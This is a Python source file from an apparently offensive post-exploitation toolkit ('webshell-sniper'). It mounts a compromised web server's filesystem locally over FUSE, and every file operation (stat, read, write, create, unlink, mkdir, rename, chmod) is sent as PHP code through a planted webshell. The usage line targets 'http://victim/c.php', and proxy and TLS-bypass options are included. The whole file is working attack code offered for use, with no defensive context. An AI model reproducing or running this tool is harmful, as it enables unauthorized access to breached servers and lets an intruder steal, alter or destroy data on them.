"""Mount a compromised server's filesystem locally over the webshell, via FUSE.

Optional feature — install the extra::

    uv pip install 'webshell-sniper[mount]'      # or: pip install ...

then::

    webshell-sniper-mount http://victim/c.php POST c /mnt/victim

This is a modernised port of v1's ``mount.py``; it fixes the v1 bugs (``rmdir``
referencing an undefined ``mode``, ``write`` opening the file ``'rb'``, the
inverted ``random_string`` argument order) and routes every operation through
the package's :class:`Executor`, so proxy/TLS/timeout settings apply.
"""

from __future__ import annotations

import argparse
import base64
import errno
import sys

from .config import Config
from .core.executor import Executor
from .core.php import php_string
from .core.transport import Transport

try:
    # fusepy raises OSError (EnvironmentError), not ImportError, when the native
    # libfuse library is absent even though the Python package is installed.
    from fuse import FUSE, FuseOSError, Operations

    _HAVE_FUSE = True
except (ImportError, OSError):  # pragma: no cover - exercised only without the extra
    _HAVE_FUSE = False
    FuseOSError = OSError  # type: ignore[assignment,misc]
    Operations = object  # type: ignore[assignment,misc]


class WebFS(Operations):  # type: ignore[misc]
    def __init__(self, executor: Executor):
        self.executor = executor

    def _php(self, code: str) -> str:
        return self.executor.run_php(code)

    def getattr(self, path, fh=None):
        out = self._php(f"$s=@stat({php_string(path)});echo $s?implode(',',$s):''").strip()
        if not out:
            raise FuseOSError(errno.ENOENT)
        s = out.split(",")
        return {
            "st_mode": int(s[2]), "st_ino": int(s[1]), "st_dev": int(s[0]),
            "st_nlink": int(s[3]), "st_uid": int(s[4]), "st_gid": int(s[5]),
            "st_size": int(s[7]), "st_atime": int(s[8]),
            "st_mtime": int(s[9]), "st_ctime": int(s[10]),
        }

    def readdir(self, path, fh):
        out = self._php(f"$d=@scandir({php_string(path)});echo $d?implode(chr(10),$d):''")
        names = [n for n in out.split("\n") if n]
        return names or [".", ".."]

    def read(self, path, size, offset, fh):
        code = (
            f"$f=fopen({php_string(path)},'rb');fseek($f,{int(offset)});"
            f"echo base64_encode(fread($f,{int(size)}));fclose($f)"
        )
        return base64.b64decode(self._php(code))

    def write(self, path, data, offset, fh):
        encoded = base64.b64encode(data).decode()
        code = (
            f"$f=fopen({php_string(path)},'cb');fseek($f,{int(offset)});"
            f"$n=fwrite($f,base64_decode('{encoded}'));fclose($f);echo $n"
        )
        return int(self._php(code) or "0")

    def create(self, path, mode, fi=None):
        self._php(f"touch({php_string(path)});@chmod({php_string(path)},{mode & 0o777});echo 1")
        return 0

    def truncate(self, path, length, fh=None):
        self._php(
            f"$f=fopen({php_string(path)},'r+');ftruncate($f,{int(length)});fclose($f);echo 1"
        )

    def unlink(self, path):
        self._php(f"echo @unlink({php_string(path)})?1:0")

    def mkdir(self, path, mode):
        self._php(f"echo @mkdir({php_string(path)},{mode & 0o777})?1:0")

    def rmdir(self, path):
        self._php(f"echo @rmdir({php_string(path)})?1:0")

    def rename(self, old, new):
        self._php(f"echo @rename({php_string(old)},{php_string(new)})?1:0")

    def chmod(self, path, mode):
        self._php(f"echo @chmod({php_string(path)},{mode & 0o777})?1:0")
        return 0


def main(argv: list[str] | None = None) -> int:
    if not _HAVE_FUSE:
        print(
            "fusepy is required for mounting. Install with: "
            "uv pip install 'webshell-sniper[mount]'",
            file=sys.stderr,
        )
        return 1

    parser = argparse.ArgumentParser(
        prog="webshell-sniper-mount",
        description="Mount a webshell target's filesystem locally over FUSE.",
    )
    parser.add_argument("url")
    parser.add_argument("method")
    parser.add_argument("password")
    parser.add_argument("mountpoint")
    parser.add_argument("--timeout", type=float, default=15.0)
    parser.add_argument("--proxy")
    parser.add_argument("--insecure", action="store_true")
    args = parser.parse_args(argv)

    config = Config(timeout=args.timeout, proxy=args.proxy, verify_ssl=not args.insecure)
    executor = Executor(Transport(args.url, args.method, args.password, config))
    FUSE(WebFS(executor), args.mountpoint, foreground=True, nothreads=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
